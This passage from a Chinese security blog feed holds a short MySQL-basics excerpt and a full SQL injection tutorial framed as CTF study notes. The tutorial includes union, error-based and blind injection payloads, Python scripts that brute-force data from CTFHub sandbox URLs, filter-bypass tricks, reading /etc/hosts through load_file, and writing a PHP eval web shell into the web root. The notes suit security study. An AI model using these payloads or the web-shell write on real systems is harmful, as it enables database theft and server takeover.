      <url>/2020/08/27/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%8Asql%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p><img src="%22http://img.ex1t.xyz/20201230175643.jpg%22"></p><h2 id="数据库及SQL-MySQL基础"><a href="#数据库及SQL-MySQL基础" class="headerlink" title="数据库及SQL/MySQL基础"></a>数据库及SQL/MySQL基础</h2><h3 id="1-啥是数据库"><a href="#1-啥是数据库" class="headerlink" title="1.  啥是数据库???"></a>1.  啥是数据库???</h3><p>说的通俗一点，数据库就像粮仓一样，粮仓的作用是用来管理和存储粮食，那么数据库就是用来存储和管理数据。</p><h4 id="1-1-数据库的优点"><a href="#1-1-数据库的优点" class="headerlink" title="1.1 数据库的优点"></a>1.1 数据库的优点</h4><ol><li>可存储大量的数据；</li><li>十分方便检索</li><li>可以保持数据的一致性和完整性；</li><li>安全、可共享；</li><li>可以通过组合分析的手段产生新的数据。<h4 id="1-2-数据库的发展历程"><a href="#1-2-数据库的发展历程" class="headerlink" title="1.2 数据库的发展历程"></a>1.2 数据库的发展历程</h4></li></ol><p>下面即将进入数据库的第一个发展历程：<br><img src="http://img.ex1t.xyz/20201230175833.jpg"><br>程序员压力大呀</p><ol><li>人工管理数据：</li><li>数据不保存；</li><li>数据需要应用程序自己管理，没有相应的软件系统来负责数据的管理工作，比较麻烦；</li><li>数据不可共享；</li><li>数据布局有独立性，数据的逻辑结构或物理结构发生变化后，就需要对相应的程序作出相应的更改，这就有加大了程序员的负担。<br>第二个发展历程：<br><img src="http://img.ex1t.xyz/20201230175845.jpg"><br>对此面无表情</li></ol><ul><li>文件系统：</li></ul><ol><li>数据可以长期保存了</li><li>由专门的软件即文件系统进行数据管理，程序和数据之间由软件提供的存取方法进行转换，使应用程序与数据之间有了一定的独立性，程序和数据间有了独立性，程序员们可以解放了，可以将精力集中于算法上了。</li><li>数据共享性差</li><li>数据独立性低<br>即将到达现代；<br><img src="http://img.ex1t.xyz/20201230175857.png"><br>解放啦</li></ol><ul><li>数据库系统阶段：</li></ul><ol><li>数据结构化；</li><li>数据共享好，冗余度低</li><li>数据独立性高</li><li>数据又DBMS统一管理和控制<h3 id="常见的数据库有哪些呢？"><a href="#常见的数据库有哪些呢？" class="headerlink" title="常见的数据库有哪些呢？"></a>常见的数据库有哪些呢？</h3></li></ol><ul><li>Oracle；（甲骨文）</li><li>DB2；（IBM）</li><li>SQL server；（微软）</li><li>Sybase；（塞尔斯）</li><li>MySQL；（甲骨文）<br>#亲们，前面是数据库名，后面是数据库的厂商哈。<h3 id="我们该怎样理解数据库呢？"><a href="#我们该怎样理解数据库呢？" class="headerlink" title="我们该怎样理解数据库呢？"></a>我们该怎样理解数据库呢？</h3></li></ul><p>我们常见的数据</p>]]></content>
      
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞大总结1-SQL注入</title>
      <link href="/2020/07/30/%E6%BC%8F%E6%B4%9E%E5%A4%A7%E6%80%BB%E7%BB%931-sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/07/30/%E6%BC%8F%E6%B4%9E%E5%A4%A7%E6%80%BB%E7%BB%931-sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.ex1t.xyz/20201230173056.jpg"></p><h1 id="漏洞大总结1-SQL注入——-诚默"><a href="#漏洞大总结1-SQL注入——-诚默" class="headerlink" title="漏洞大总结1-SQL注入—— 诚默"></a>漏洞大总结1-SQL注入—— 诚默</h1><blockquote><p>攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作,这个就是SQL注入。</p></blockquote><h3 id="1、什么是注入"><a href="#1、什么是注入" class="headerlink" title="1、什么是注入"></a>1、什么是注入</h3><h4 id="1-1-首先要了解注入的原理"><a href="#1-1-首先要了解注入的原理" class="headerlink" title="1.1 首先要了解注入的原理"></a>1.1 首先要了解注入的原理</h4><p>就比如前端查询用户id得到用户的数据<br>        id=传入的值<br>后台定义的语句如下</p><pre><code>    `date=select * from  user where id=传入的值`    `return date`</code></pre><p>原本正常用户输入的值应当是1、2、3<br>但是恶意用户可以输入<code> -1 or 1=1</code>  获得全部的用户数据<br>或输入 -1 union select user()   通过联合查询获取当前用户</p><h4 id="1-2-分类"><a href="#1-2-分类" class="headerlink" title="1.2 分类"></a>1.2 分类</h4><ol><li>有回显的注入<ul><li>联合注入<ul><li>整数注入</li><li>字符注入</li><li>搜索注入</li></ul></li><li>报错注入</li></ul></li><li>没有回显的注入<ul><li>布尔注入</li><li>时间盲注</li></ul></li><li>二次注入</li></ol><p>所以仔细分下来<strong>联合注入（整数、字符、搜索）、报错注入、布尔注入、时间盲注、二次注入</strong></p><h4 id="1-3-漏洞利用"><a href="#1-3-漏洞利用" class="headerlink" title="1.3 漏洞利用"></a>1.3 漏洞利用</h4><h5 id="1-3-1-联合注入"><a href="#1-3-1-联合注入" class="headerlink" title="1.3.1 联合注入"></a>1.3.1 联合注入</h5><p>使用联合注入的场景一般为数据库查询的数据会回显到页面<br>其中分为整数注入、字符注入、搜索注入<br>分为这几种也是获取的数据类型或功能不同，<br>后台代码大致如下</p><ul><li><p>整数注入后台代码<br><code>date=select * from  user where id=前台传输的数据</code></p></li><li><p>字符注入后台代码<br><code>date=select * from  user where id='前台传输的数据'</code></p></li><li><p>搜索注入<br><code>date=select * from user  where name like '%前台传输的数据%'</code></p></li></ul><p>所以要查询当前用户，需要使用不同的数据<br>由于后台得到的数据会进行字符化处理，我们使用单引号来引起提前闭合，所以需要使用注释符（#或–）来注释最后一个单引号。<br>注意的是，注释符后面还需要加个空格。</p><ul><li><p>整数注入：id=-1 union select user()</p><p>  <code>date=select * from  user where id=-1 union select user()</code></p></li><li><p>字符注入：id=-1’ union select user() – </p><p>  <code>date=select * from  user where id='-1' union select user() -- '</code></p></li><li><p>搜索注入：name=%’ union select user() – </p><p>  <code>date=select * from user  where name like '%%' union select user() -- %'</code></p></li></ul><p>获取所有数据</p><ul><li><p>整数注入：id=1 or 1=1</p><p>  <code>date=select * from  user where id=-1 or 1=1</code></p></li><li><p>字符注入：id=’ or ‘1’=’1</p><p>  <code>date=select * from  user where id='' or '1'='1'</code></p></li><li><p>搜索注入：name=%‘ or ‘%’=’</p><p>  <code>date=select * from  user where id='%%' or '%'='%'</code></p></li></ul><p>对联合注入先就说到这里</p><h5 id="1-3-2-报错注入"><a href="#1-3-2-报错注入" class="headerlink" title="1.3.2 报错注入"></a>1.3.2 报错注入</h5><blockquote><p>报错注入分为<strong>updatexml</strong>、<strong>floor</strong>和<strong>exp</strong></p></blockquote><h6 id="平时用的最多的是updatexml"><a href="#平时用的最多的是updatexml" class="headerlink" title="平时用的最多的是updatexml"></a>平时用的最多的是<strong>updatexml</strong></h6><p><code>UPDATEXML (XML_document, XPath_string, new_value);</code></p><ol><li>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</li><li>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</li><li>第三个参数：new_value，String格式，替换查找到的符合条件的数据</li></ol><p><strong>作用：</strong> 改变文档中符合条件的节点的值　<br>concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出用户<br>0x7e ASCII码,实为~,upadtexml()报错信息为特殊字符、字母及之后的内容,为了前面字母丢失,开头连接一个特殊字符~ </p><p><strong>eg:</strong></p><ul><li>concat(‘m’,’y’)=my</li><li>concat中的sql语句可以被执行</li><li>concat执行sql注入语句，再利用updatexml的报错信息返回sql语句执行结果</li><li>updatexml第二个参数必须是字符串吧，所以才需要借助返回值为字符串的concat函数。</li><li>1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));<pre><code>  查询当前用户</code></pre></li></ul><h6 id="再说floor"><a href="#再说floor" class="headerlink" title="再说floor"></a>再说floor</h6><p>报错的原理是<strong>rand</strong>和<strong>ordery by</strong>或<strong>group by</strong>的冲突<br><code>select count(*) from test group by floor(rand(0)*2);</code><br>因为 rand 函数的特殊性（如果使用rand()的话，该值会被计算多次）<br>group by 进行分组时，<strong>floor(rand(0)*2)**执行一次（查看分组是否存在），如果虚拟表中不存在该分组，那么在插入新分组的时候 **floor(rand(0)*2)</strong> 就又计算了一次。（其实在上述 rand(0) 产生多个数据的时候，也能观察出来。只要 rand(0) 被调用，一定会产生新值）。<br>rand是伪随机。<br>所以*<em>floor(rand(0)<em>2)</em></em>值依此是011011001<br>当 group by 对其进行分组的时候，首先遇到第一个值 0 ，发现 0 不存在，于是需要插入分组，就在这时，*<em>floor(rand(0)<em>2)</em></em>再次被触发，生成第二个值 1 ，因此最终插入虚拟表的也就是第二个值 1 ；然后遇到第三个值 1 ，因为已经存在分组 1 了，就直接计数加1（这时1的计数变为2）;遇到第四个值 0 的时候，发现 0 不存在，于是又需要插入新分组，然后floor(rand(0)*2)又被触发，生成第五个值 1 ，因此这时还是往虚拟表里插入分组 1 ，但是，分组 1 已经存在了！所以报错</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">?id=1'+and(    select 1 from (select count(*),concat((select (         select (select concat(0x7e,version(),0x7e                                                    )                                            ))                                            from infomatioon_shcema.tables limt 0,1                    )floor(rand(0)*2)) x from information_schema.tables group by x)a)%23 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>%23是注释符#的url编码</p><h6 id="exp函数报错"><a href="#exp函数报错" class="headerlink" title="exp函数报错"></a>exp函数报错</h6><p>本质是溢出报错<br>exp是以e为底的指数函数，<br>但是，由于数字太大是会产生溢出。这个函数会在参数大于709时溢出，报错。<br>~是取反符<br>我们通过子查询与按位求反，造成一个DOUBLE overflow error，并借由此注出数据。<br><code>?id=1' and exp(~(  select * from (select user()   )x))%23</code></p><h5 id="1-3-3-布尔注入"><a href="#1-3-3-布尔注入" class="headerlink" title="1.3.3 布尔注入"></a>1.3.3 布尔注入</h5><p>由于开发者将报错信息屏蔽导致，但是网页对于真假有不同的回显<br>只显示你当前的条件是否正确或者错误，例如我们判断字段数 order by 2返回正确，order by 3返回错误<br>一般经常使用的函数有以下几种分类</p><ol><li>截取函数</li></ol><ul><li>substr()</li><li>left()</li><li>right()</li></ul><ol start="2"><li>转换函数</li></ol><ul><li>ascii（）将字符串转换为ascii码</li><li>hex（）将字符串的值转换为16进制的值</li><li>面对布尔盲注，我们想要获取自己想知道的信息时，需要判断信息的每一位的ASCII码，对于返回的信息是否正确，直接观察页面的返回正常与否即可,虽然可以手动判断，但是花费时间过长，但是我使用常规的盲注脚本发现没有出现正常结果。<br>到<code>and 1=1</code>和<code>and 1=2</code>返回的都是success，所以我们使用<code>if(expr1,expr2,expr3)</code>函数来盲注<br>具体脚本</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">'http://challenge-b4f28550822194be.sandbox.ctfhub.com:10080/?id='</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#0-3,假设四条记录，第i条开始</span>    name<span class="token operator">=</span><span class="token string">''</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token string">'0123456789zaqwsxedcrfvtgbyhnujmikolp_'</span><span class="token punctuation">:</span><span class="token comment">#判断字符</span>            test_url<span class="token operator">=</span>url<span class="token operator">+</span>             '<span class="token keyword">if</span>    <span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span>select table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit <span class="token operator">%</span>d<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span>d<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token operator">=</span><span class="token string">"%s"</span><span class="token punctuation">,</span>    <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span>select table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>tables<span class="token punctuation">)</span>    <span class="token punctuation">)</span>'    <span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>k<span class="token punctuation">)</span>  <span class="token comment">#分别是第i条记录，第j个字符，k字符</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>test_url<span class="token punctuation">)</span>    rep<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>test_url<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'query_success'</span> <span class="token keyword">in</span> rep<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        name<span class="token operator">=</span>name<span class="token operator">+</span>k        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到表名</p><h5 id="1-3-4-时间盲注"><a href="#1-3-4-时间盲注" class="headerlink" title="1.3.4 时间盲注"></a>1.3.4 时间盲注</h5><p>在<code>?id=1</code> 后面添加 <code>and sleep(10)</code><br>这个延迟时间测试是否有时间盲注的时候设长一点，因为是手动测试是否有漏洞，为了避免网络的原因让我们漏掉漏洞，sleep(10)之后可以看到网站有明显的延迟，证明时间盲注存在<br>时间盲注会用到<code>sleep(time)</code>函数，还有if函数<br><code>if(1,2,3)</code>：如果1真，则执行2，否则执行3<br><code>Sleep(x)</code>：执行延迟x秒<br>先判断数据库的长度和数据库名称<br>具体脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token keyword">import</span> sysheaders <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"user-agent"</span><span class="token punctuation">:</span><span class="token string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)"</span><span class="token punctuation">}</span>chars <span class="token operator">=</span> <span class="token string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'</span>database <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">global</span> length<span class="token keyword">for</span> l <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      lengthUrl <span class="token operator">=</span> 'http<span class="token punctuation">:</span><span class="token operator">//</span>challenge<span class="token operator">-</span>c13b65fc664e2e69<span class="token punctuation">.</span>sandbox<span class="token punctuation">.</span>ctfhub<span class="token punctuation">.</span>com<span class="token punctuation">:</span><span class="token number">10080</span><span class="token operator">/</span>?       <span class="token operator">+</span><span class="token string">'id=1 and if(length(database())&gt;{0},1,sleep(3))--+'</span>       lengthUrlFormat <span class="token operator">=</span> lengthUrl<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span>  <span class="token comment">#判断数据长度</span>      start_time0 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#获取时间    </span>       rsp0 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>lengthUrlFormat<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span class="token keyword">if</span>  time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time0 <span class="token operator">&gt;</span> <span class="token number">2.5</span><span class="token punctuation">:</span>              <span class="token keyword">print</span> <span class="token string">'database length is '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span>            <span class="token keyword">global</span> length               length <span class="token operator">=</span> l               <span class="token keyword">break</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>           <span class="token keyword">pass</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#根据长度来弄出名</span>      <span class="token keyword">for</span> char <span class="token keyword">in</span> chars<span class="token punctuation">:</span> <span class="token comment">#chars是所有字符 anbcd...</span>          charAscii <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span>  <span class="token comment">#全部大写</span>          url <span class="token operator">=</span> 'http<span class="token punctuation">:</span><span class="token operator">//</span>challenge<span class="token operator">-</span>c13b65fc664e2e69<span class="token punctuation">.</span>sandbox<span class="token punctuation">.</span>ctfhub<span class="token punctuation">.</span>com<span class="token punctuation">:</span><span class="token number">10080</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span>            <span class="token operator">+</span><span class="token string">'and if(ascii(substr(database(),{0},1))&gt;{1},1,sleep(3))--+'</span>          urlformat <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>charAscii<span class="token punctuation">)</span> <span class="token comment">#名的第i个字符，与某个字符比较</span>           start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        rsp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>urlformat<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token comment">#访问</span>         <span class="token keyword">if</span>  time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time <span class="token operator">&gt;</span> <span class="token number">2.5</span><span class="token punctuation">:</span>               database<span class="token operator">+=</span>char              <span class="token keyword">print</span> <span class="token string">'database: '</span><span class="token punctuation">,</span>database               <span class="token keyword">break</span>           <span class="token keyword">else</span><span class="token punctuation">:</span>              <span class="token keyword">pass</span><span class="token keyword">print</span> <span class="token string">'database is '</span> <span class="token operator">+</span> database<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="1-3-5-二次注入"><a href="#1-3-5-二次注入" class="headerlink" title="1.3.5 二次注入"></a>1.3.5 二次注入</h5><p>二次注入是因为数据在第一次进入数据库的时候进行了过滤和转义<br>当这条数据从数据取出来在sql语句中进行拼接，而这次拼接中没有过滤<br>一般比较难发现，所以比赛中很难发现，一般CTF出题人会给源码，或者提示<br>二次注入也一般不是单纯的二次注入，通常还有报错注入或bool盲注，要写脚本模拟</p><h4 id="2、找到漏洞"><a href="#2、找到漏洞" class="headerlink" title="2、找到漏洞"></a>2、找到漏洞</h4><p>再谈一谈怎么发现注入点<br>常见的注入点位置有</p><ol><li><p>GET参数的注入</p><p> 这个最容易发现，就是参数在url中，如<a href="http://www.ex1t.com/?id=1">www.ex1t.com?id=1</a></p></li><li><p>POST参数的注入</p><p> 这个需要通过抓包，使用burp或者浏览器插件hackbar等</p></li><li><p>User-Agent的注入</p><p> 使用Burp的Repeater模块（重发器）当然，以上都可以使用sqlmap来测试。<br> 一般注入点都发生在常进行数据变动的地方，比如进行数据查询</p></li></ol><p>然后再判断是否有注入</p><p>1.输入单引号</p><pre><code>最常见检测，让sql语句产生单引号未闭合错误</code></pre><ol start="2"><li><p>注入类型判断</p><p> and 1=1(数字型) 和 ‘and ‘1’=’1(字符串)和 %’ and ‘%’=’(搜索型)进行判断</p></li><li><p>通过数字加减来判断是不是整数型</p><p>id=3-1结果和id=2结果是否一样。<br>日常中常用的还是单引号，and，or</p></li></ol><h4 id="3、绕过过滤"><a href="#3、绕过过滤" class="headerlink" title="3、绕过过滤"></a>3、绕过过滤</h4><p>通常会有以下方式防Sql注入</p><h5 id="3-1-过滤关键词"><a href="#3-1-过滤关键词" class="headerlink" title="3.1 过滤关键词"></a>3.1 过滤关键词</h5><h6 id="3-1-1-过滤select、or、from等关键字"><a href="#3-1-1-过滤select、or、from等关键字" class="headerlink" title="3.1.1 过滤select、or、from等关键字"></a>3.1.1 过滤select、or、from等关键字</h6><p>有些题目是将关键词替换为空，这时候能使用穿插关键字方法绕过<br>那可以通过双写，大小写绕过</p><ol><li>双写</li></ol><ul><li>selselectect –&gt; select</li><li>oorr –&gt; or</li></ul><ol start="2"><li>大小写</li></ol><ul><li>SeLect</li><li>Or</li></ul><h6 id="3-1-2-如果只是过滤了or-and-xor-not等等"><a href="#3-1-2-如果只是过滤了or-and-xor-not等等" class="headerlink" title="3.1.2 如果只是过滤了or and xor not等等"></a>3.1.2 如果只是过滤了or and xor not等等</h6><ul><li>and = &amp;&amp;</li><li>or = ||</li><li>xor = | # 异或</li><li>not = !</li></ul><h6 id="3-1-3-有时候过滤函数是通过十六进制进行过滤。"><a href="#3-1-3-有时候过滤函数是通过十六进制进行过滤。" class="headerlink" title="3.1.3 有时候过滤函数是通过十六进制进行过滤。"></a>3.1.3 有时候过滤函数是通过十六进制进行过滤。</h6><p>可以对关键字的个别字符进行替换</p><pre><code>    select --&amp;gt; selec\x74</code></pre><p>有时候通过双重URL编码进行绕过操作</p><pre><code>    %25%36%66%25%37%32 --&amp;gt; %6f%72 --&amp;gt; or</code></pre><p>还有内联注释绕过<br>内联注释就是把一些特有的仅在MYSQL上的语句放在 /<em>!…</em>/ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。<br><code>mysql&amp;gt; select * from users where id = -1 union /*!select*/ 1,2,3;</code></p><h5 id="3-2-过滤空格"><a href="#3-2-过滤空格" class="headerlink" title="3.2 过滤空格"></a>3.2 过滤空格</h5><h6 id="3-2-1-通过注释绕过，一般的注释符有如下几个"><a href="#3-2-1-通过注释绕过，一般的注释符有如下几个" class="headerlink" title="3.2.1 通过注释绕过，一般的注释符有如下几个"></a>3.2.1 通过注释绕过，一般的注释符有如下几个</h6><ul><li>#</li><li>--<br>//</li><li>/**/</li><li>;%00</li></ul><p>可以通过注释符来绕过空格</p><pre class="line-numbers language-none"><code class="language-none">select/**/name/**/from/**/user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="3-2-2-通过URL编码绕过，我们知道空格-20，所以可以通过二次URL编码进行绕过"><a href="#3-2-2-通过URL编码绕过，我们知道空格-20，所以可以通过二次URL编码进行绕过" class="headerlink" title="3.2.2 通过URL编码绕过，我们知道空格%20，所以可以通过二次URL编码进行绕过"></a>3.2.2 通过URL编码绕过，我们知道空格%20，所以可以通过二次URL编码进行绕过</h6><pre class="line-numbers language-none"><code class="language-none">%20 --&gt; %2520<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="3-2-3-通过空白字符绕过，各个数据库都有一些空白字符"><a href="#3-2-3-通过空白字符绕过，各个数据库都有一些空白字符" class="headerlink" title="3.2.3 通过空白字符绕过，各个数据库都有一些空白字符"></a>3.2.3 通过空白字符绕过，各个数据库都有一些空白字符</h6><pre class="line-numbers language-none"><code class="language-none">MySQL5--09,0A,0B,0C,0D,A0,20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="3-2-4-通过特殊字符（如括号，反引号等）"><a href="#3-2-4-通过特殊字符（如括号，反引号等）" class="headerlink" title="3.2.4 通过特殊字符（如括号，反引号等）"></a>3.2.4 通过特殊字符（如括号，反引号等）</h6><pre><code>select(user())</code></pre><h6 id="3-2-5-科学计数法绕过"><a href="#3-2-5-科学计数法绕过" class="headerlink" title="3.2.5 科学计数法绕过"></a>3.2.5 科学计数法绕过</h6><pre class="line-numbers language-none"><code class="language-none">select user,password from users where user_id=0e1union select 1,2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="3-3-过滤单引号"><a href="#3-3-过滤单引号" class="headerlink" title="3.3 过滤单引号"></a>3.3 过滤单引号</h5><p>过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为\ ' 。</p><pre><code>id=-1%df%27union select 1,user(),3--+</code></pre><p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</p><ol><li>%df 吃掉 \ 具体的方法是 urlencode(‘) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</li><li>将 ' 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</li></ol><pre class="line-numbers language-none"><code class="language-none">%df%27=====(addslashes)======&gt;%df%5c%27======(GBK)======&gt;運’id=-1%df%27union select 1,user(),3--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="3-4-过滤等号"><a href="#3-4-过滤等号" class="headerlink" title="3.4 过滤等号"></a>3.4 过滤等号</h5><p>使用like 、rlike 、regexp 或者 使用比较符（）</p><h5 id="3-5-过滤逗号"><a href="#3-5-过滤逗号" class="headerlink" title="3.5 过滤逗号"></a>3.5 过滤逗号</h5><p>可以使用join方法绕过</p><pre class="line-numbers language-none"><code class="language-none">union select 1,2,3 join语句： union select * from (select 1)a join (select 2)b join (select 3) <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="3-6-过滤比较符（）"><a href="#3-6-过滤比较符（）" class="headerlink" title="3.6 过滤比较符（）"></a>3.6 过滤比较符（）</h5><p>使用greatest()、least（）：（前者返回最大值，后者返回最小值）</p><h5 id="3-7-过滤注释符（-–）"><a href="#3-7-过滤注释符（-–）" class="headerlink" title="3.7 过滤注释符（#,–）"></a>3.7 过滤注释符（#,–）</h5><pre class="line-numbers language-none"><code class="language-none">id=1' union select 1,2,3||'1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后的or ‘1闭合查询语句的最后的单引号，或者：</p><pre class="line-numbers language-none"><code class="language-none">id=1' union select 1,2,'3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.8 进行编码绕过</p><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p><pre class="line-numbers language-none"><code class="language-none">or 1=1%6f%72%20%31%3d%31CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-SQL读写文件"><a href="#4-SQL读写文件" class="headerlink" title="4 SQL读写文件"></a>4 SQL读写文件</h4><p>在了解SQL注入的原理、方法、过滤之后</p><p>继续学习一下SQL读写文件</p><p>CTF中有的flag在文件中，但是存在SQL注入，渗透过程中，你也可以写入木马文件</p><p>在具有file权限的情况下，使用load_file和into  outfile/dumpfile进行读写</p><p>读取文件</p><pre class="line-numbers language-none"><code class="language-none">?id=-1+union+select+load_file('/etc/hosts')<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在某些绕过单引号的情况下，可以使用文件名的十六进制来作为load_file函数的参数</p><pre class="line-numbers language-none"><code class="language-none">?id=-1+union+select+load_file(0x2f6574632f686f737473)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以通过sql写文件</p><pre class="line-numbers language-none"><code class="language-none">?id=-1+union+select+’&lt;?php eval($_POST[-7]);&gt;‘+into+outfile'/var/www/html/shell.php'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或</p><pre class="line-numbers language-none"><code class="language-none">?id=-1+union+select+unhex(一句话shell的十六进制)+into+dumpfile'/var/www/html/shell.php'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>值得注意的是，除了要有写文件的权限，文件名不能是已存在的.</p><h4 id="5-总结"><a href="#5-总结" class="headerlink" title="5 总结"></a>5 总结</h4><p>就此关于SQL注入的总结已经完成了，最近在看CTF特训营，顿时发觉自己学的还很浅，于是觉得该好好的总结一次。除了CTF特训营上的内容，还有以前浏览网上各大博主发表的wp、总结等所记录的笔记，学会了很多。如果本文存在错误或有其他问题以及还存在补充，敬请指正。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一题python加密题</title>
      <link href="/2020/07/08/%E4%B8%80%E9%A2%98python%E5%8A%A0%E5%AF%86%E9%A2%98/"/>
      <url>/2020/07/08/%E4%B8%80%E9%A2%98python%E5%8A%A0%E5%AF%86%E9%A2%98/</url>
      
